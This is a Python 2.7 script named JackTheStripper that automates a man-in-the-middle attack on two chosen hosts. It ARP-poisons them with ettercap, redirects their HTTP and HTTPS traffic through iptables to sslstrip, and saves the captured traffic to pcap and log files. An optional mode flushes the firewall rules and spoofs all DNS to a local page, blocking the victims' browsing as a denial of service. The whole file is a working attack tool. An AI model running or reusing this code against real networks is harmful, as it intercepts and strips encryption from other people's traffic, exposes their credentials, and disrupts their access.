#!/usr/bin/python2.7
# Script to perform MITM (Man In The Middle) attacks using ARP poisoning to intercept all messages going between two targets.
# @depends iptables; ettercap; sslstrip.
# @author Cascudo <lucas.redeaberta.com.br>; Elfotux <elfotux@gmail.com>; N3k00n3; UserX
# @born 2014-10-19

import sys, numpy, getopt, subprocess

class JackTheStripper():

	networkInterface = target1 = target2 = useRemoteBrowser = useDnsSpoof = blockWebBrowsing = ''

	def main(self):
		self.splash()
		self.checkCompliance()
		self.setParams()
		if self.blockWebBrowsing.lower() == 'y': self.block()
		else: self.transpose()
		self.poison()

	def splash(self):
		print "     ____.              __     ___________.__            "
		print "    |    |____    ____ |  | __ \__    ___/|  |__   ____  "
		print "    |    \__  \ _/ ___\|  |/ /   |    |   |  |  \_/ __ \ "
		print '/\__|    |/ __ \\\\  \___|    <    |    |   |   Y  \  ___/ '
		print "\________(____  /\___  >__|_ \   |____|   |___|  /\___  >"
		print "              \/     \/     \/                 \/     \/ "
		print "  _________ __         .__                               "
		print " /   _____//  |________|__|_____ ______   ___________    "
		print " \_____  \\\\   __\_  __ \  \____ \\\\____ \_/ __ \_  __ \   "
		print " /        \|  |  |  | \/  |  |_> >  |_> >  ___/|  | \/   "
		print "/_______  /|__|  |__|  |__|   __/|   __/ \___  >__|      "
		print "        \/                |__|   |__|        \/          "
		
	def introduceYourself(self):
		'Examples'
		print 'Example 1: jackthestripper'
		print 'Example 2: jackthestripper -i wlan0 --t1 10.0.0.1 --t2 10.0.0.3 --block-web-browsing --remote-browser --dns-spoof'
		sys.exit(0)

	def checkCompliance(self):
		'Looks for broken dependencies'
		isCompliant = True
		p = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output, errors = p.communicate()
		if output.strip() != 'root':
			isCompliant = False
			print 'This script must be run as root. Aborting.'
		else:
			requirements = [
				[['ettercap', '-v']],
				[['iptables', '--version']],
				[['sslstrip', '-h']]
			]
			for r in requirements:
		   		try:
					p = subprocess.Popen(r[0], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				except OSError:
					isCompliant = False
					print r[0][0] + ' was not found. Please install it before proceed.'
		if not isCompliant:
			sys.exit(2)

	def setParams(self):
		'Sets necessary parameters'
		try:                                
			opts, args = getopt.getopt(sys.argv[1:], "i:h", ["t1=", "t2=", "block-web-browsing", "dns-spoof", "help", "remote-browser"])
		except getopt.GetoptError:
			print "Wrong use. Aborting."
			self.introduceYourself()
		for opt, arg in opts:
			if opt == '-h' or opt == '--help' : self.introduceYourself()
			elif opt == '-i': self.networkInterface = arg
			elif opt == '--remote-browser': self.useRemoteBrowser = 'Y'
			elif opt == '--dns-spoof': self.useDnsSpoof = 'Y'
			elif opt == '--block-web-browsing': self.blockWebBrowsing = 'Y'
			elif opt == '--t1': self.target1 = arg
			elif opt == '--t2': self.target2 = arg
		if self.networkInterface == '': self.networkInterface = raw_input('Choose a network interface: ')
		if self.target1 == '': self.target1 = raw_input('Insert target 1: ')
		if self.target2 == '': self.target2 = raw_input('Insert target 2: ')
		if self.useRemoteBrowser == '': self.useRemoteBrowser = raw_input('Enable remote_browser plugin? (y/n) ')
		if self.blockWebBrowsing == '': self.blockWebBrowsing = raw_input('Block victim\'s web browsing (Denial of Service)? (y/n) ')
		if self.blockWebBrowsing == 'Y' or self.blockWebBrowsing == 'y': self.useDnsSpoof = self.blockWebBrowsing
		elif self.useDnsSpoof == '': self.useDnsSpoof = raw_input('Enable dns_spoof plugin? (y/n) ')

	def transpose(self):
		'Sets necessary HTTP and HTTPS firewall redirection rules'
		portsToCheck = [['http', '80'],['https', '443']]
		for p in portsToCheck:
			p1 = subprocess.Popen(['iptables', '-L', '-t', 'nat'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			p2 = subprocess.Popen(['grep', 'dpt:' + p[0] + ' redir ports 10000'], stdin=p1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			p1.stdout.close()
			output, errors = p2.communicate()
			p2.stdout.close()
			if output == "":
				subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.networkInterface, '-p', 'tcp', '--dport', p[1], '-j', 'REDIRECT', '--to-port', '10000'])

	def getIpAddress(self, ifname):
		import socket, struct, fcntl
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
	    	s.fileno(),
			0x8915,  # SIOCGIFADDR
			struct.pack('256s', ifname[:15])
		)[20:24])

	def block(self):
		'Replaces all browsed pages with a pirate flag'
		import tarfile, os, shutil
		wwwroot = ''
                wwwroot = "/srv/http" if os.path.isdir ("/srv/http") else ("/var/www/html" if os.path.isdir("/var/www/html") else ("/var/www" if os.path.isdir("/var/www") else '')) 
		if wwwroot == '':
			print 'Could not find a valid webroot path, please install apache2 or httpd before proceed'
			sys.exit(2)
		else:
			tar = tarfile.open("flag.tar.gz")
			tar.extractall()
			tar.close()
			os.rename('index.html', wwwroot + '/index.html')
			os.rename('flag.mp4', wwwroot + '/flag.mp4')
			dnsFile = open('etter.dns', 'w+')
			dnsFile.write('*.* A ' + self.getIpAddress(self.networkInterface))
			dnsFile.close()
			shutil.copy2('etter.dns', '/usr/share/ettercap/etter.dns')
			os.rename('etter.dns', '/etc/ettercap/etter.dns')
                        p1 = subprocess.Popen(['systemctl', 'start', 'httpd.service'])
#			p1 = subprocess.Popen(['service', 'httpd', 'start'])
			subprocess.call(['iptables', '-t', 'nat', '-F'])
			subprocess.call(['iptables', '-F', 'INPUT'])
			subprocess.call(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])

	def poison(self):
		'Performs the MITM attack'
		print 'Monitoring traffic between ' + self.target1 + ' and ' + self.target2 + ' using interface: '+ self.networkInterface + '.'
		p = subprocess.Popen(['date', '+%Y%m%d_%H%M%S'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		logId, errors = p.communicate()
		logId = logId.strip()
		ettercapCommand = ['ettercap', '-p', '-i', self.networkInterface, '-T', '-q', '-M', 'arp:remote', '/'+ self.target1 + '//', '/' + self.target2 + '//', '-w', 'ettercap_' + logId + '.pcap']
		if self.useRemoteBrowser == 'y' or self.useRemoteBrowser == 'Y':
			ettercapCommand = numpy.concatenate([ettercapCommand, ['-P', 'remote_browser']])
		if self.useDnsSpoof == 'y' or self.useDnsSpoof == 'Y':
			ettercapCommand = numpy.concatenate([ettercapCommand, ['-P', 'dns_spoof']])
		runSslstrip = self.blockWebBrowsing != 'y' and self.blockWebBrowsing != 'Y'
		if runSslstrip:
			subprocess.Popen(['sslstrip', '-k', '-f', '-w', 'sslstrip_' + logId + '.log'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		subprocess.call(ettercapCommand)
		print 'ettercap Stopped. Stopping sslstrip.'
		print 'Logs and capture files were created at current directory.'
		if not runSslstrip:
			subprocess.call(['killall', 'sslstrip'])

if __name__ == "__main__":
    JackTheStripper().main()
